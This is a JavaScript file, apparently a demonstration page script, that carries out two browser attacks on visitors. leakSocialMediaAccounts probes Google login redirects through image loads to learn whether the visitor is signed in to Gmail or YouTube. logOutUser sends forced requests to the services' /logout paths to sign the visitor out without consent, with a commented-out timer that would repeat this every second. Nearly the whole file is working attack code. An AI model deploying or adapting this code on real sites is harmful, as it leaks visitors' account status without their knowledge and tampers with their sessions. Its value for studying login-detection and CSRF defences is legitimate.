var platforms = [{
	domain: "https://accounts.google.com",
	redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google.com%2Ffavicon.ico&uilel=3&hl=en&service=mail",
	name: "Gmail",
	loggedIn: false,
	logoutPath:"/logout"
	},{
		domain: "https://accounts.google.com",
		redirect: "/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Ffavicon.ico&uilel=3&hl=en&service=youtube",
		name: "Youtube",
		loggedIn : true,
		logoutPath:"/logout"    	
	}
];

		
var leakSocialMediaAccounts = function(callback) {
	
	platforms.forEach(function(network) {
		var img = document.createElement('img');
		img.src = network.domain + network.redirect;
		img.onload = function() {
			network.loggedIn=true;            
			callback(network, true);
		};
		img.onerror = function() {
			network.loggedIn=false;            
			callback(network, false);
		};
	});
};

var isFirstLoggedIn = true;

function displayResult(network, loggedIn) {
	var id = loggedIn ? 'loggedIn' : 'notLoggedIn';
	var favicon = faviconUri(network);
	var url = network.domain + network.redirect;
	var el = '<a target="_blank" href="' + url + '" target="_blank" class="network btn"><img src=' + favicon + '> <span>' + network.name + '</span></a>';
	if (loggedIn && isFirstLoggedIn) {
		isFirstLoggedIn = false;
		document.getElementById(id).innerHTML = el;
	} else {
		document.getElementById(id).innerHTML += el;
	}
}

leakSocialMediaAccounts(displayResult);

function faviconUri(network) {
	var favicon = network.domain + '/favicon.ico';
	if (network.name === 'Dropbox') {
		favicon = 'https://www.dropbox.com/static/images/favicon.ico';
	}
	if (network.name === 'Youtube') {
		favicon = 'https://www.youtube.com/favicon.ico';
	}
	if (network.name === 'Gmail') {
		favicon = 'https://mail.google.com/favicon.ico';
	}
	
	return favicon;
}

function logOutUser(){

		console.log('Starting to log out');
	
		platforms.forEach(function(network) {
			if(network.loggedIn===true){
				console.log('Checking:' + network.name);

				var img = document.createElement('img');
				img.src = network.domain + network.logoutPath;
				img.onload = function() {
					//This fuction will never be called because these url dont return an image
					console.log("Logout Sucessfully");          
				};
			
				img.onerror = function() {
					console.log("Logging you out of " + network.name);          				            
				};
			};
		
		location.reload();			
		});

};

// setInterval(logOutUser,1000);	
